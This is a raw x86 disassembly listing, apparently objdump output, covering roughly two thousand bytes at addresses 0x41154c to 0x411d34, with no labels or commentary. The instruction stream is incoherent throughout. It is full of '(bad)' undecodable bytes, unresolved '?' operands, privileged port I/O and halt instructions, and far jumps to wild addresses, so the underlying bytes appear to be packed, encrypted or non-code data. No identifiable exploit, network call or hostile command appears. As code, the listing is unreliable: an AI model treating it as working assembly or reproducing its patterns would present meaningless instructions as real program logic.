  41154c:	or     DWORD PTR [eax],edx
  41154e:	push   edi
  41154f:	(bad)  
  411551:	mov    ds:0xca846fdc,eax
  411556:	push   esp
  411557:	xchg   DWORD PTR [ebx+edx*8],ebp
  41155a:	(bad)  
  41155b:	jnp    0x411501
  41155d:	pop    ds
  41155e:	fwait
  41155f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411560:	sbb    edx,DWORD PTR [edx-0x1d838f93]
  411566:	xchg   edx,eax
  411567:	les    edx,FWORD PTR [edi]
  411569:	xchg   ebp,eax
  41156a:	pop    ss
  41156b:	mov    dl,0xc2
  41156d:	leave  
  41156e:	ret    0x94e4
  411571:	mov    al,0xb
  411573:	mov    edx,0x8d753bd0
  411578:	mov    cl,0x47
  41157a:	popa   
  41157b:	dec    eax
  41157c:	mov    ?,WORD PTR [ecx]
  41157e:	hlt    
  41157f:	pusha  
  411580:	hlt    
  411581:	sub    eax,0xa2c5418e
  411586:	stos   DWORD PTR es:[edi],eax
  411587:	mov    WORD PTR [edx-0x65],gs
  41158a:	mov    eax,0x2fbae45a
  41158f:	mov    dh,BYTE PTR [edx-0x19]
  411592:	jb     0x41154e
  411594:	add    al,0xe7
  411596:	push   edx
  411597:	mov    WORD PTR [eax-0x63c24ad8],ss
  41159d:	aas    
  41159e:	cmp    DWORD PTR [edi+0x1c3c984c],eax
  4115a4:	add    DWORD PTR [ebp+ebx*2-0x1d12450a],edi
  4115ab:	jne    0x411626
  4115ad:	push   0x5d
  4115af:	fwait
  4115b0:	dec    esp
  4115b1:	sbb    cl,BYTE PTR [edx+0x65]
  4115b4:	(bad)  [ebx+0x5d]
  4115b7:	jns    0x4115c4
  4115b9:	mov    bl,0xf4
  4115bb:	sub    eax,0x56bc86d5
  4115c0:	pop    edx
  4115c1:	enter  0xacf7,0x89
  4115c5:	stc    
  4115c6:	les    ebx,FWORD PTR [ecx-0x29]
  4115c9:	cmp    ebp,DWORD PTR [ebp+0x4b51c3bb]
  4115cf:	mov    ds:0x8c20ee7b,eax
  4115d4:	ret    
  4115d5:	xchg   DWORD PTR [esi+0x37efe92e],edx
  4115db:	aas    
  4115dc:	xchg   ebp,eax
  4115dd:	daa    
  4115de:	mov    WORD PTR [eax-0x14ca8786],?
  4115e4:	inc    edx
  4115e5:	jg     0x41159a
  4115e7:	pop    ebx
  4115e8:	in     eax,dx
  4115e9:	pop    eax
  4115ea:	in     al,0x21
  4115ec:	cmc    
  4115ed:	test   al,0x36
  4115ef:	sbb    BYTE PTR [ecx+0x704abf86],cl
  4115f5:	repz cwde 
  4115f7:	fwait
  4115f8:	mov    esp,0x7c9a056f
  4115fd:	inc    ebx
  4115fe:	cmp    bl,ah
  411600:	jno    0x411622
  411602:	pop    ebx
  411603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411604:	pop    eax
  411605:	sahf   
  411606:	stc    
  411607:	mov    edi,0x21e744f0
  41160c:	cmp    al,0x89
  41160e:	and    al,BYTE PTR [eax+0x7f]
  411611:	sbb    ebp,DWORD PTR [ecx]
  411613:	push   edi
  411614:	mov    ah,ah
  411616:	mov    edi,0x383a419b
  41161b:	punpckhdq mm4,QWORD PTR [edi+eax*1-0x73]
  411620:	mov    edx,edi
  411622:	popf   
  411623:	gs (bad) 
  411625:	cmp    eax,DWORD PTR [eax+0x38]
  411628:	les    edi,FWORD PTR [edi]
  41162a:	add    al,0xff
  41162c:	stos   BYTE PTR es:[edi],al
  41162d:	mov    dl,0xdc
  41162f:	pop    eax
  411630:	(bad)  
  411631:	lock (bad) 
  411634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411635:	into   
  411636:	xlat   BYTE PTR ds:[ebx]
  411637:	jb     0x4115de
  411639:	pop    ecx
  41163a:	and    ecx,edx
  41163c:	enter  0xb2b7,0xcb
  411640:	lods   eax,DWORD PTR ds:[esi]
  411641:	iret   
  411642:	inc    esp
  411643:	mov    ds:0x2d99346c,eax
  411648:	jnp    0x4116c6
  41164a:	and    ebp,edi
  41164c:	test   DWORD PTR ds:0x85332144,ebp
  411652:	pop    eax
  411653:	mov    ch,0x1d
  411655:	fwait
  411656:	push   eax
  411657:	jae    0x4116b0
  411659:	in     al,0x5e
  41165b:	mov    bh,0xa4
  41165d:	sub    BYTE PTR [eax-0xde621bd],al
  411663:	add    BYTE PTR [esi+esi*8-0x50a73175],dh
  41166a:	loop   0x411667
  41166c:	sbb    al,0xee
  41166e:	lock js 0x411619
  411671:	pop    ds
  411672:	fcmovbe st,st(5)
  411674:	push   ebp
  411675:	mov    ch,BYTE PTR [edx]
  411677:	aaa    
  411678:	das    
  411679:	(bad)  
  41167a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41167b:	mov    ecx,0x6adccf82
  411681:	cmp    edx,edi
  411683:	mov    bh,0x7e
  411685:	sbb    bl,BYTE PTR [ecx-0x6630a586]
  41168b:	les    edi,FWORD PTR [ebx]
  41168d:	xchg   DWORD PTR [ecx-0x41f1271c],ecx
  411693:	mov    ah,0xc
  411695:	fwait
  411696:	inc    ebp
  411697:	stc    
  411698:	out    0x84,al
  41169a:	(bad)
  41169e:	adc    BYTE PTR [ebp+0x28],0x85
  4116a2:	and    eax,0xb359bbb1
  4116a7:	push   edx
  4116a8:	stos   DWORD PTR es:[edi],eax
  4116a9:	fdiv   DWORD PTR [eax-0x4b8b0458]
  4116af:	mov    ch,0xb8
  4116b1:	(bad)  
  4116b2:	outs   dx,BYTE PTR cs:[esi]
  4116b4:	sahf   
  4116b5:	inc    esp
  4116b6:	dec    edx
  4116b7:	and    ah,0x8c
  4116ba:	call   0x9dc746d2
  4116bf:	call   0x8c8a5f56
  4116c4:	sbb    eax,0xb3bac33c
  4116c9:	mov    al,ds:0xa87b61b9
  4116ce:	push   ss
  4116cf:	stc    
  4116d0:	xchg   esi,eax
  4116d1:	ficomp DWORD PTR [edi-0x5501512a]
  4116d7:	sbb    eax,0xb1aae494
  4116dc:	in     eax,0x82
  4116de:	jle    0x411696
  4116e0:	mov    bh,0x2c
  4116e2:	dec    ecx
  4116e3:	or     bl,BYTE PTR [ecx+0x77a01e9e]
  4116e9:	fdivr  st(4),st
  4116eb:	rcl    BYTE PTR [eax+0x57],cl
  4116ee:	push   ebp
  4116ef:	dec    esp
  4116f0:	and    ebp,DWORD PTR [eax+eax*8]
  4116f3:	shl    BYTE PTR ds:0x42c501e,1
  4116f9:	dec    edi
  4116fa:	and    DWORD PTR [eax],0x2c948143
  411700:	push   cs
  411701:	lock (bad) 
  411703:	in     al,dx
  411704:	hlt    
  411705:	fwait
  411706:	and    bh,BYTE PTR [edx+0x40]
  411709:	in     al,dx
  41170a:	add    ah,BYTE PTR [esi-0xf]
  41170d:	test   eax,0x36a86c96
  411712:	test   eax,0xc65f833d
  411717:	ret    0xa1d3
  41171a:	and    edi,ebx
  41171c:	aas    
  41171d:	ja     0x411732
  41171f:	xlat   BYTE PTR ds:[ebx]
  411720:	mov    al,0xdc
  411722:	shl    DWORD PTR [eax+esi*2+0x6d],cl
  411726:	adc    ebp,ecx
  411728:	(bad)
  41172b:	xchg   ebp,eax
  41172c:	sub    eax,0x3eb2cc44
  411731:	and    al,0xc8
  411733:	dec    esi
  411734:	outs   dx,BYTE PTR ds:[esi]
  411735:	mov    esi,0xd1a61fdf
  41173a:	jo     0x411724
  41173c:	fld    QWORD PTR [edx]
  41173e:	aam    0x8f
  411740:	add    BYTE PTR [ecx-0xe409be0],bl
  411746:	fs mov eax,0xf248be4c
  41174c:	in     eax,dx
  41174d:	daa    
  41174e:	call   0x4400:0xf428ce14
  411755:	push   ss
  411756:	xor    DWORD PTR [ebp+0x16],esi
  411759:	shl    edi,1
  41175b:	les    ecx,FWORD PTR [ecx-0x2fcc204f]
  411761:	(bad)  
  411762:	or     bl,BYTE PTR [edx]
  411764:	(bad)  
  411765:	(bad)  
  411766:	push   eax
  411767:	scas   al,BYTE PTR es:[edi]
  411768:	clc    
  411769:	xchg   edi,eax
  41176a:	xchg   esp,eax
  41176b:	mov    al,BYTE PTR [edx+ebx*1]
  41176e:	jmp    0x4117c7
  411770:	fsub   QWORD PTR [eax]
  411772:	or     bl,BYTE PTR [edx-0x22dcb994]
  411778:	int3   
  411779:	xor    al,0xc8
  41177b:	push   ecx
  41177c:	mov    bh,bl
  41177e:	fninit 
  411780:	mov    al,dh
  411782:	pop    ecx
  411783:	inc    esp
  411784:	not    ebx
  411786:	dec    ecx
  411787:	push   ss
  411788:	mov    edi,0x27c82c92
  41178d:	loope  0x411718
  41178f:	mov    edi,0x13675db1
  411794:	in     al,0xdd
  411796:	pop    edx
  411797:	in     al,dx
  411798:	sub    ch,BYTE PTR [ebp-0xc787b1d]
  41179e:	shl    DWORD PTR [ecx-0x78f74bb5],1
  4117a4:	dec    esp
  4117a5:	call   0x946a78d4
  4117aa:	pop    eax
  4117ab:	push   ds
  4117ac:	popa   
  4117ad:	cwde   
  4117ae:	mov    dl,0x1f
  4117b0:	xor    eax,0x3a8dfbe5
  4117b5:	adc    esp,DWORD PTR [edi-0x25c69726]
  4117bb:	lods   eax,DWORD PTR ds:[esi]
  4117bc:	cwde   
  4117bd:	xor    BYTE PTR [esi-0x5d],cl
  4117c0:	test   BYTE PTR [esi-0xc],al
  4117c3:	mov    esp,0x965e17
  4117c8:	fiadd  WORD PTR [eax+edx*4-0x17]
  4117cc:	mov    ecx,DWORD PTR [ebp+0x68]
  4117cf:	jnp    0x4117f1
  4117d1:	and    al,BYTE PTR [ecx]
  4117d3:	and    al,0x7a
  4117d5:	jmp    0x63136f1d
  4117da:	mov    eax,ds:0x1b9f0bff
  4117df:	loope  0x411820
  4117e1:	out    0x90,al
  4117e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117e4:	xor    DWORD PTR [edx+0x4cf4c8a5],eax
  4117ea:	popf   
  4117eb:	adc    eax,0xe0273197
  4117f0:	pop    esp
  4117f1:	and    ebp,DWORD PTR [edi-0x26d1fce7]
  4117f7:	sbb    DWORD PTR [ebp+0x6db32d19],0xffffff9f
  4117fe:	popf   
  4117ff:	ror    BYTE PTR [eax-0x4e325ff8],cl
  411805:	sbb    eax,0xb1c12ae5
  41180a:	mov    edx,0xe4f48a2e
  41180f:	jmp    0x411805
  411811:	pop    eax
  411812:	or     bh,BYTE PTR [ecx+0x5bb8ec3b]
  411818:	sub    DWORD PTR [edi+0x3cce4e85],ebp
  41181e:	cs pop ss
  411820:	push   ds
  411821:	mov    bh,ch
  411823:	mov    ds:0x8c355358,al
  411828:	mov    cl,0x9d
  41182a:	inc    eax
  41182b:	out    0x7e,eax
  41182d:	(bad)  
  41182e:	aas    
  41182f:	mov    ecx,0x6f4e669e
  411834:	or     BYTE PTR [edx-0x5616206b],dl
  41183a:	jb     0x411858
  41183c:	jbe    0x41188e
  41183e:	sbb    al,0x1d
  411840:	xchg   ebp,eax
  411841:	les    eax,FWORD PTR [ebx+0x4d]
  411844:	sub    DWORD PTR [ebp+0x47],0x78
  411848:	sub    esp,ebx
  41184a:	push   ebx
  41184b:	pop    ebx
  41184c:	adc    edi,DWORD PTR [eax+0x29]
  41184f:	adc    ebp,ebp
  411851:	jg     0x4118b9
  411853:	xchg   esp,eax
  411854:	mov    dh,BYTE PTR [ebp+0x7517f96a]
  41185a:	xlat   BYTE PTR ds:[ebx]
  41185b:	or     al,0x3e
  41185d:	cmp    BYTE PTR [edi],bh
  41185f:	aad    0x46
  411861:	xchg   ecx,eax
  411862:	adc    al,0x56
  411864:	aaa    
  411865:	pushf  
  411866:	mov    esp,0x72bdcce7
  41186b:	test   DWORD PTR [edx],ebx
  41186d:	xchg   edx,eax
  41186e:	imul   edi,DWORD PTR [ecx-0x484b666b],0x3601b873
  411878:	xchg   edx,eax
  411879:	icebp  
  41187a:	daa    
  41187b:	dec    DWORD PTR [ecx+0x347d17f3]
  411881:	jl     0x411899
  411883:	mov    ss,ebx
  411885:	fmul   DWORD PTR [esp+ecx*2-0x12]
  411889:	and    BYTE PTR [ebp-0x33],ch
  41188c:	shl    DWORD PTR [ebp+0x48],cl
  41188f:	lods   al,BYTE PTR ds:[esi]
  411890:	push   ds
  411891:	test   BYTE PTR [eax],al
  411893:	ins    BYTE PTR es:[edi],dx
  411894:	fst    DWORD PTR ds:[ebx+0x5d306e7a]
  41189b:	mov    ch,0x68
  41189d:	leave  
  41189e:	xchg   esp,eax
  41189f:	push   cs
  4118a0:	push   cs
  4118a1:	aam    0x9f
  4118a3:	add    cl,BYTE PTR ds:0xab17cb0e
  4118a9:	xchg   ebp,eax
  4118aa:	out    dx,al
  4118ab:	and    ah,BYTE PTR [edx+ebx*8-0x42b80d68]
  4118b2:	test   al,0x4d
  4118b4:	sbb    BYTE PTR [ebp+0x41],0xb7
  4118b8:	or     eax,0x6a8a8d3
  4118bd:	imul   ebx,esi,0x78fe324
  4118c3:	inc    eax
  4118c4:	add    al,0x96
  4118c6:	inc    ebp
  4118c7:	and    eax,0xd0eb19
  4118cc:	std    
  4118cd:	push   ebx
  4118ce:	add    BYTE PTR [esi],al
  4118d0:	lock adc al,0x7b
  4118d3:	popf   
  4118d4:	cmp    DWORD PTR [edx-0x8],0xfffffffa
  4118d8:	outs   dx,DWORD PTR ds:[esi]
  4118d9:	xor    DWORD PTR [edx+0x30db31b6],esp
  4118df:	bnd ja 0x4118c4
  4118e2:	add    bl,BYTE PTR [edi+0x54487117]
  4118e8:	mov    ds:0x8976afe5,al
  4118ed:	xchg   DWORD PTR gs:[ecx+0x58],esp
  4118f1:	mov    bl,ah
  4118f3:	and    eax,0xc07cb583
  4118f8:	sbb    al,0xb4
  4118fa:	sub    al,0x64
  4118fc:	in     al,dx
  4118fd:	and    ebp,ebp
  4118ff:	cmp    eax,DWORD PTR [edi-0x10]
  411902:	push   ds
  411903:	lock push esp
  411905:	push   ss
  411906:	pop    ebx
  411907:	push   eax
  411908:	dec    ecx
  411909:	ins    BYTE PTR es:[edi],dx
  41190a:	xchg   BYTE PTR [ecx+0x35],dh
  41190d:	aam    0x92
  41190f:	jmp    0xd308122c
  411914:	add    esi,eax
  411916:	pop    esp
  411917:	cmc    
  411918:	mov    BYTE PTR [eax],ah
  41191a:	js     0x411944
  41191c:	jge    0x4118d0
  41191e:	and    bl,ch
  411920:	imul   BYTE PTR [eax+0x40466d78]
  411926:	cmp    DWORD PTR [edx+0x7],ebp
  411929:	xchg   ebx,eax
  41192a:	out    dx,al
  41192b:	dec    edx
  41192c:	and    eax,0xdcc2cd5e
  411931:	hlt    
  411932:	(bad)  
  411934:	test   eax,0x9ad22269
  411939:	jns    0x411919
  41193b:	sahf   
  41193c:	repz scas eax,DWORD PTR es:[edi]
  41193e:	xor    BYTE PTR [edx+0x5195572f],ah
  411944:	mov    al,ds:0x14e31a54
  411949:	and    dh,BYTE PTR [ecx-0x5036bc9d]
  41194f:	pop    ebx
  411950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411951:	push   cs
  411952:	rcl    BYTE PTR [ecx-0x37],cl
  411955:	or     eax,0xed0c8fe6
  41195a:	sub    BYTE PTR ss:[ecx+0x34d2a77a],0x88
  411962:	cmp    edx,esp
  411964:	(bad)  
  411965:	in     eax,dx
  411966:	or     DWORD PTR [esi-0x43540c6f],ebp
  41196c:	popf   
  41196d:	mov    ch,0x6a
  41196f:	stos   BYTE PTR es:[edi],al
  411970:	jecxz  0x411985
  411972:	mov    ah,0x6a
  411974:	mov    dh,BYTE PTR [edx+0x6a]
  411977:	out    0x13,eax
  411979:	(bad)  
  41197a:	push   ebp
  41197b:	fs and al,0xfd
  41197e:	fistp  QWORD PTR [ecx+0x32]
  411981:	mov    ch,ch
  411983:	jmp    0x41194d
  411985:	stos   DWORD PTR es:[edi],eax
  411986:	loope  0x411938
  411988:	xchg   edi,eax
  411989:	loopne 0x411924
  41198b:	loopne 0x411912
  41198d:	dec    esp
  41198e:	setne  dl
  411991:	ror    BYTE PTR [ebx-0x48],0x21
  411995:	or     eax,0xfe711b0a
  41199a:	pusha  
  41199b:	xchg   esp,eax
  41199c:	rcl    bl,cl
  41199e:	scas   eax,DWORD PTR es:[edi]
  41199f:	add    dl,BYTE PTR [eax]
  4119a1:	dec    esp
  4119a2:	adc    ecx,DWORD PTR ds:0x83ace919
  4119a8:	inc    esp
  4119a9:	xchg   ebx,eax
  4119aa:	sub    DWORD PTR [ecx+0x6c],ebx
  4119ad:	mov    eax,0xe77fba8e
  4119b2:	lea    eax,ds:0xc80997a8
  4119b8:	shl    DWORD PTR [edi],1
  4119ba:	mov    cl,BYTE PTR [edi+0xd]
  4119bd:	ret    
  4119be:	push   esp
  4119bf:	ins    BYTE PTR es:[edi],dx
  4119c0:	(bad)  
  4119c1:	xchg   edx,eax
  4119c2:	pop    ecx
  4119c3:	mov    cl,0xfc
  4119c5:	adc    al,0x4f
  4119c7:	stc    
  4119c8:	stc    
  4119c9:	or     ebx,DWORD PTR [ebp+0x7685a050]
  4119cf:	jno    0x411a0e
  4119d1:	xor    BYTE PTR [ebx-0x39ae7af4],bl
  4119d7:	loopne 0x411a26
  4119d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119da:	pop    ebp
  4119db:	repz out dx,eax
  4119dd:	sub    al,0x93
  4119df:	pop    ecx
  4119e0:	sub    bl,BYTE PTR [eax-0x4d88d2a]
  4119e6:	cli    
  4119e7:	rcr    BYTE PTR [edi-0x14484922],0xd9
  4119ee:	stos   BYTE PTR es:[edi],al
  4119ef:	xor    eax,0xcfb13033
  4119f4:	sub    BYTE PTR [eax-0x21fc0a10],0x77
  4119fb:	xor    edi,DWORD PTR [eax]
  4119fd:	adc    bl,bh
  4119ff:	add    DWORD PTR [esp+esi*2-0x56],edi
  411a03:	mov    ?,WORD PTR [eax]
  411a05:	sbb    al,0x8a
  411a07:	std    
  411a08:	ret    
  411a09:	push   0x1d5521ca
  411a0e:	scas   eax,DWORD PTR es:[edi]
  411a0f:	in     al,dx
  411a10:	sub    ebx,edi
  411a12:	sbb    eax,DWORD PTR [eax-0x20]
  411a15:	sbb    al,0x7a
  411a17:	or     ecx,eax
  411a19:	jle    0x411a84
  411a1b:	xor    al,0xaf
  411a1d:	sahf   
  411a1e:	cmp    DWORD PTR [edi+0x7c90600e],ecx
  411a24:	cmp    bl,bh
  411a26:	fild   WORD PTR [ecx]
  411a28:	sar    cl,cl
  411a2a:	and    esi,DWORD PTR [eax+esi*1]
  411a2d:	cmp    eax,0x29bab9aa
  411a32:	inc    ebx
  411a33:	mov    dh,0x74
  411a35:	mov    eax,ds:0xf5683e26
  411a3a:	xlat   BYTE PTR ds:[ebx]
  411a3b:	das    
  411a3c:	jecxz  0x4119db
  411a3e:	xchg   edx,eax
  411a3f:	or     DWORD PTR [eax+ecx*1-0x639ecaac],0xb1b693d9
  411a4a:	cmp    dl,BYTE PTR [edi]
  411a4c:	or     eax,0x190339b4
  411a51:	into   
  411a52:	(bad)  
  411a53:	cld    
  411a54:	clc    
  411a55:	jne    0x411acb
  411a57:	cmp    edx,esp
  411a59:	in     al,0xc8
  411a5b:	je     0x411a6b
  411a5d:	mov    esp,0xc903e283
  411a62:	dec    ecx
  411a63:	or     eax,0x19569b4a
  411a68:	std    
  411a69:	inc    ebp
  411a6a:	pop    ebp
  411a6b:	(bad)  
  411a6c:	dec    ebx
  411a6d:	enter  0xf2d5,0x5a
  411a71:	and    al,0xfe
  411a73:	out    dx,al
  411a74:	sbb    BYTE PTR [ebx+ecx*2-0x80],dh
  411a78:	dec    ecx
  411a79:	xor    al,0x7
  411a7b:	test   eax,0x48a6eea5
  411a80:	cmp    ebx,DWORD PTR [esi]
  411a82:	mov    ch,BYTE PTR [ebp+0x41a3d678]
  411a88:	mov    ecx,0x63d6d3de
  411a8d:	fld    DWORD PTR ds:0x2fb7577
  411a93:	idiv   DWORD PTR [edi-0x5e334560]
  411a99:	sbb    eax,0xef77ed72
  411a9e:	sbb    ecx,DWORD PTR [ecx+0x16]
  411aa1:	lock test eax,0x36b7f49
  411aa7:	mov    ecx,0xb12e300a
  411aac:	jle    0x411a63
  411aae:	mov    bl,0xcc
  411ab0:	jno    0x411ac7
  411ab2:	add    BYTE PTR [ecx-0x48646589],ah
  411ab8:	in     eax,dx
  411ab9:	inc    edi
  411aba:	loopne 0x411aca
  411abc:	pop    ss
  411abd:	mov    esp,DWORD PTR [ecx-0x4e71ac6c]
  411ac3:	jg     0x411ab1
  411ac5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ac6:	lahf   
  411ac7:	lods   al,BYTE PTR ds:[esi]
  411ac8:	dec    esi
  411ac9:	cmp    DWORD PTR [eax-0x28fb52c7],eax
  411acf:	sbb    al,0x57
  411ad1:	and    WORD PTR [bx+si-0x4687],bx
  411ad7:	cmp    al,0xf0
  411ad9:	in     eax,dx
  411ada:	js     0x411b0a
  411adc:	je     0x411ab4
  411ade:	pop    ebp
  411adf:	das    
  411ae0:	in     al,dx
  411ae1:	inc    ebx
  411ae2:	adc    DWORD PTR [ecx+0x2ace75a0],0xe17de0e6
  411aec:	aam    0x66
  411aee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411aef:	je     0x411a97
  411af1:	xor    DWORD PTR [ebp-0x7f],0xffffff97
  411af5:	or     BYTE PTR [edx],dl
  411af7:	xor    bl,ch
  411af9:	icebp  
  411afa:	repz and DWORD PTR [ebx+0x55cb5414],0xef4f0790
  411b05:	add    eax,0xe7e78d52
  411b0a:	into   
  411b0b:	push   eax
  411b0c:	fild   DWORD PTR [eax+ebx*1+0x4d1ce1ac]
  411b13:	ins    DWORD PTR es:[edi],dx
  411b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b15:	sbb    bl,BYTE PTR [ecx+0x1d16090c]
  411b1b:	mov    edi,0x62daf5d3
  411b20:	mov    ebp,0xbc71c3eb
  411b25:	cdq    
  411b26:	or     eax,0xb6986f8d
  411b2b:	test   BYTE PTR [eax],ah
  411b2d:	push   ebx
  411b2e:	mov    al,0x48
  411b30:	dec    ecx
  411b31:	mov    ss,WORD PTR [ecx+edi*4+0x45]
  411b35:	leave  
  411b36:	adc    eax,0x663bde74
  411b3b:	repz icebp 
  411b3d:	in     eax,0x4d
  411b3f:	enter  0x4d51,0xc5
  411b43:	mov    edx,0xe5e7ff02
  411b48:	jns    0x411ad9
  411b4a:	icebp  
  411b4b:	adc    bl,BYTE PTR [esi-0x36]
  411b4e:	cmp    DWORD PTR [esi],eax
  411b50:	pop    ecx
  411b51:	pop    ds
  411b52:	jle    0x411bce
  411b54:	pop    edi
  411b55:	ss test eax,0x20108be3
  411b5b:	rcl    BYTE PTR [ebx-0x58b9f1f5],cl
  411b61:	pushf  
  411b62:	xchg   edi,eax
  411b63:	push   ss
  411b64:	ins    DWORD PTR es:[edi],dx
  411b65:	ja     0x411b14
  411b67:	mov    dh,0xe6
  411b69:	dec    esi
  411b6a:	add    al,BYTE PTR [edx-0x68]
  411b6d:	ss push eax
  411b6f:	aam    0xaa
  411b71:	inc    BYTE PTR [eax-0x70]
  411b74:	das    
  411b75:	pop    edi
  411b76:	cs mov dh,0xb0
  411b79:	sbb    esi,DWORD PTR [esi]
  411b7b:	mov    cl,0x29
  411b7d:	gs add al,0xe2
  411b80:	js     0x411b62
  411b82:	mov    esp,esp
  411b84:	rcl    DWORD PTR [ebx-0x54],1
  411b87:	mov    bh,0x45
  411b89:	xor    al,0xaf
  411b8b:	call   0x2a34e900
  411b90:	add    dl,BYTE PTR [eax-0x7aabf498]
  411b96:	gs scas al,BYTE PTR es:[edi]
  411b98:	popa   
  411b99:	push   edi
  411b9a:	and    al,0x33
  411b9c:	aam    0xbf
  411b9e:	dec    esi
  411b9f:	aaa    
  411ba0:	pop    es
  411ba1:	cli    
  411ba2:	dec    edi
  411ba3:	stos   BYTE PTR es:[edi],al
  411ba4:	cmp    BYTE PTR [eax],bh
  411ba6:	xchg   BYTE PTR [edi+0x50],dh
  411ba9:	mov    dl,0x9e
  411bab:	pop    ss
  411bac:	shl    BYTE PTR [edx-0x6],0xde
  411bb0:	add    eax,0x3422f6c5
  411bb5:	inc    esp
  411bb6:	mov    bl,0x11
  411bb8:	mov    al,0x9a
  411bba:	jbe    0x411bcc
  411bbc:	sub    al,dl
  411bbe:	ror    DWORD PTR [edx+0x1abe1a63],0x2c
  411bc5:	(bad)  
  411bc6:	call   0x6683950d
  411bcb:	retf   
  411bcc:	aaa    
  411bcd:	and    ebp,0x5818d2dc
  411bd3:	out    dx,al
  411bd4:	gs jl  0x411ba2
  411bd7:	out    dx,eax
  411bd8:	sbb    DWORD PTR [ebx+ecx*1+0x725a4b94],0x3cc788eb
  411be3:	and    eax,0x5a212fc4
  411be8:	jns    0x411bfe
  411bea:	xchg   esi,eax
  411beb:	gs lahf 
  411bed:	mov    cl,ah
  411bef:	jne    0x411c6e
  411bf1:	(bad)  
  411bf2:	fdiv   st,st(1)
  411bf4:	movd   mm4,esi
  411bf7:	pop    ds
  411bf8:	sbb    al,0xaa
  411bfa:	mov    al,BYTE PTR [eax+ebx*4-0x16bb13ab]
  411c01:	pop    ds
  411c02:	and    DWORD PTR [eax+eax*1],0x7a
  411c06:	je     0x411bf6
  411c08:	xchg   edx,eax
  411c09:	mov    cl,0x46
  411c0b:	push   edx
  411c0c:	loope  0x411bb3
  411c0e:	hlt    
  411c0f:	mov    eax,0x67d19777
  411c14:	jp     0x411c64
  411c16:	push   edx
  411c17:	fist   DWORD PTR [edx]
  411c19:	(bad)  
  411c1b:	lods   eax,DWORD PTR ds:[esi]
  411c1c:	cmp    al,0x9c
  411c1e:	xchg   edi,eax
  411c1f:	cmp    DWORD PTR [edx+0x949616c],esp
  411c25:	loop   0x411c55
  411c27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c28:	push   ss
  411c29:	or     ah,BYTE PTR [eax+0x5b644550]
  411c2f:	pop    eax
  411c30:	repz xor ebx,DWORD PTR [edx-0x59]
  411c34:	mov    eax,0x185493b0
  411c39:	sub    eax,0x55bfe46e
  411c3e:	jle    0x411ca7
  411c40:	pop    esi
  411c41:	jns    0x411c54
  411c43:	lock stc 
  411c45:	add    DWORD PTR [edx+0x22],ebx
  411c48:	or     ebx,DWORD PTR [ebx+0x5ce89828]
  411c4e:	sub    ebp,DWORD PTR [edi+0x35]
  411c51:	nop
  411c52:	push   0x65c77b6b
  411c57:	sbb    DWORD PTR [esi],edx
  411c59:	xchg   esp,eax
  411c5a:	lods   al,BYTE PTR ds:[esi]
  411c5b:	dec    edx
  411c5c:	inc    esp
  411c5d:	cmp    BYTE PTR [ebx],bl
  411c5f:	add    al,0xf
  411c61:	pop    ecx
  411c62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c63:	xchg   BYTE PTR [edi-0x115362df],bh
  411c69:	pop    ebp
  411c6a:	sub    eax,DWORD PTR [ecx+0x4cc037a5]
  411c70:	add    bl,dh
  411c72:	adc    ebp,DWORD PTR [edi+0x45e00e5b]
  411c78:	jmp    0x365:0x57227164
  411c7f:	(bad)  
  411c80:	push   eax
  411c81:	int3   
  411c82:	sti    
  411c83:	in     al,dx
  411c84:	mul    BYTE PTR [esi]
  411c86:	jp     0x411c55
  411c88:	shl    BYTE PTR [ecx+0x675de9c4],1
  411c8e:	push   edx
  411c8f:	adc    al,0x1f
  411c91:	inc    ecx
  411c92:	xchg   BYTE PTR [esi+ebx*1],dl
  411c95:	shr    al,0xee
  411c98:	sbb    eax,DWORD PTR [ebx+ebp*1-0x745e5e11]
  411c9f:	xchg   BYTE PTR [eax-0x20],al
  411ca2:	or     al,0x73
  411ca4:	imul   DWORD PTR [eax]
  411ca6:	add    dl,dh
  411ca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ca9:	iret   
  411caa:	xchg   DWORD PTR [ecx+ebp*4],edi
  411cad:	sub    DWORD PTR [esi],edx
  411caf:	cmp    al,0x4e
  411cb1:	repnz cmp al,0xbb
  411cb4:	lds    ecx,FWORD PTR ds:0xa5d404cb
  411cba:	jmp    0xcbb0:0x9702907d
  411cc1:	sbb    eax,0xb2f936e4
  411cc6:	xor    edi,esp
  411cc8:	xlat   BYTE PTR ds:[ebx]
  411cc9:	jl     0x411cc3
  411ccb:	and    bh,cl
  411ccd:	jecxz  0x411cf9
  411ccf:	jle    0x411cde
  411cd1:	cmc    
  411cd2:	fidiv  WORD PTR [esi+0x48ddf2d9]
  411cd8:	adc    DWORD PTR [ebx+0xbf2ec50],eax
  411cde:	jmp    0x2e1e4442
  411ce3:	test   eax,0x462b286f
  411ce8:	cwde   
  411ce9:	aad    0x8e
  411ceb:	adc    eax,0x582ff7f4
  411cf0:	(bad)  ds:0xd6dbfaad
  411cf6:	repnz mov edx,0xb1df7943
  411cfc:	retf   0xb18c
  411cff:	or     al,0xbd
  411d01:	mov    bl,0x50
  411d03:	mov    cl,0x64
  411d05:	js     0x411c94
  411d07:	gs nop
  411d09:	rcl    esi,1
  411d0b:	imul   edi,ecx,0x1a335605
  411d11:	jae    0x411d1f
  411d13:	push   esp
  411d14:	div    DWORD PTR [esi-0x63]
  411d17:	cli    
  411d18:	retf   
  411d19:	sub    BYTE PTR [edi],0x6b
  411d1c:	sbb    DWORD PTR [ebx+0x2fd2f361],esp
  411d22:	sbb    edx,DWORD PTR [edi+0x576b34bd]
  411d28:	(bad)  
  411d29:	xchg   edx,eax
  411d2a:	pop    ecx
  411d2b:	xor    BYTE PTR [esi],bl
  411d2d:	inc    eax
  411d2e:	lods   eax,DWORD PTR ds:[esi]
  411d2f:	fdivr  st(2),st
  411d31:	std    
  411d32:	jge    0x411cc9
  411d34:	mov    ebp,0x3263aca1
